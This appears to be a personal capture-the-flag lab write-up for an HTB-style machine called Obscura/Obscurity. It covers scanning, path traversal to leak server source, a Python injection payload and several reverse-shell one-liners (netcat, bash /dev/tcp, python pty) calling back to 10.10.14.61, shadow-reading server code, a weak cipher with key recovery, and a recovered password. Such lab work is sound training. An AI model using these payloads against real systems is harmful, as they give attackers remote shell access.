# Machine #[NUMBER] [NAME]  


## Nmap Results  
  <img src="https://nmap.org/images/nmap-logo-256x256.png">   

* Both full and initial scan gave the same results   
```console  
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   closed http
8080/tcp open   http-proxy
9000/tcp closed cslistener
```


<br/><br/>

## Banner Grabbing of Services  

* The http 8080  
```console
PORT     STATE SERVICE    VERSION
8080/tcp open  http-proxy BadHTTPServer
http-title: 0bscura
 fingerprint-strings: 
   GetRequest: 
     HTTP/1.1 200 OK
     Date: Fri, 21 Jan 2022 18:21:27
     Server: BadHTTPServer
     Last-Modified: Fri, 21 Jan 2022 18:21:27
     Content-Length: 4171
     Content-Type: text/html
     Connection: Closed
     <!DOCTYPE html>
     <html lang="en">
     <head>
     <meta charset="utf-8">
     <title>0bscura</title>
     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="keywords" content="">
     <meta name="description" content="">
     <!-- 
     Easy Profile Template
     http://www.templatemo.com/tm-467-easy-profile
     <!-- stylesheet css -->
     <link rel="stylesheet" href="css/bootstrap.min.css">
     <link rel="stylesheet" href="css/font-awesome.min.css">
     <link rel="stylesheet" href="css/templatemo-blue.css">
     </head>
     <body data-spy="scroll" data-target=".navbar-collapse">
     <!-- preloader section -->
     <!--
     <div class="preloader">
     <div class="sk-spinner sk-spinner-wordpress">
   HTTPOptions: 
     HTTP/1.1 200 OK
     Date: Fri, 21 Jan 2022 18:21:28
     Server: BadHTTPServer
     Last-Modified: Fri, 21 Jan 2022 18:21:28
     Content-Length: 4171
     Content-Type: text/html
     Connection: Closed
     <!DOCTYPE html>
     <html lang="en">
     <head>
     <meta charset="utf-8">
     <title>0bscura</title>
     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="keywords" content="">
     <meta name="description" content="">
     <!-- 
     Easy Profile Template
     http://www.templatemo.com/tm-467-easy-profile
     <!-- stylesheet css -->
     <link rel="stylesheet" href="css/bootstrap.min.css">
     <link rel="stylesheet" href="css/font-awesome.min.css">
     <link rel="stylesheet" href="css/templatemo-blue.css">
     </head>
     <body data-spy="scroll" data-target=".navbar-collapse">
     <!-- preloader section -->
     <!--
     <div class="preloader">
   <div class="sk-spinner sk-spinner-wordpress">

```


<br/><br/>

## Searchsploiting Results   
  <img src="https://www.offensive-security.com/wp-content/uploads/2020/05/SearchSploit-1.png" width=400 height=200>   



<br/><br/>  

## Gobustering Stuff  

  <img src="https://cdn.akamai.steamstatic.com/steam/apps/1092880/capsule_616x353.jpg?t=1605640630" width=400 height=200>  



<br/><br/>


## Thinking Out Loud   

  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQr4hzX6KoRN5PjPJjy8QC43K0T-CoXZHawDIxG4jCa9aMD1K8Vl3vhpG2a2OVbiy-i93c&usqp=CAU" width=200 height=200>  

* Found this on the website  
"Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory"  I must use it one way or another.  

* The "BadHTTPServer" could be refering to the python "BaseHTTPServer" especially that we realised that the backend is python obviously because of the previous message on the website.

* Why did nmap show me closed ports?  
  <blockquote>
  A closed port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it.
  </blockquote>


wfuzz -u http://10.129.1.140/ -H "Host: FUZZ.obscure.htb" -w /home/kali/Documents/cloned_reps/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hh 11510   

gobuster dns -d obscure -w /home/kali/Documents/cloned_reps/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t20  

python3 dirsearch.py -u http://10.129.1.140:8080 -e py,txt,php,html

* So when I dirbustered it gave me this "/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" that it results in a 500 internal server error which is good I guess because this means it triggered an error of some kind that means I'm getting closer. I hope.    
* Or just put /..'s without them being encoded gives an internal server error too.  

* So I tried this `../SuperSecureServer.py` and it worked it returned me the server's source code without even knowing what is teh directory's name ( It was wrong for them to put the exact name of the file ).   
* Check out the source code in the file in the same folder as this file.  

* I can use this to inject a rev shell in the python code  
```
/';socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.61",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);shit2='crap2
```  
* The backslash is important so that the code can understand that this is the beginning of the path.  

* Found a password that might be robert's " ´ÑÈÌÉàÙÁÑé¯·¿k " but it might not be plain text.  

* I also found the BetterSSH code  
```python
import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```   


```python
import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
    else:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Encrypting...")
        encrypted = encrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(encrypted)
```
<br/><br/>



## How Did I Solve the Machine 

   <img src="https://images.lifesizecustomcutouts.com/image/cache/catalog/febProds21/SP000081-500x500.png" width=200 height=200>   


     

## Where I Got Stuck?  

   

## What Did I learn from this Machine?  




## Writeups   
  





rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.61 4444 >/tmp/f  

nc -c bash 10.10.14.61 4444
bash -i >& /dev/tcp/10.10.14.61/4444 0>&1

bash -i >& /dev/tcp/10.10.14.61/1234 0>&1  



¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v  
Encrypting this file with your key should result in out.txt, make sure your key is correct!

python3 SuperSecureCrypt.py -d -i passwordreminder.txt -o /tmp/decryptTest -k alexandrovich 

* Robert's password  
SecThruObsFTW


* My code to get the key  

```python
# Online Python compiler (interpreter) to run Python online.
# Write Python 3 code in this online editor and run it.
plainText = ""
# put same space in cypher text as in plain text
cypherText = ""

keyPos = 0
key = ""
for x in cypherText:
    plainTextOrd = ord(plainText[keyPos])
    cypherTextOrd = ord(x)
    newChr = cypherTextOrd - plainTextOrd
    key += chr(newChr)
    keyPos += 1
print(key)
```  

* Make sure that the code is working.  


```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.61",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

<!-- tagsss -->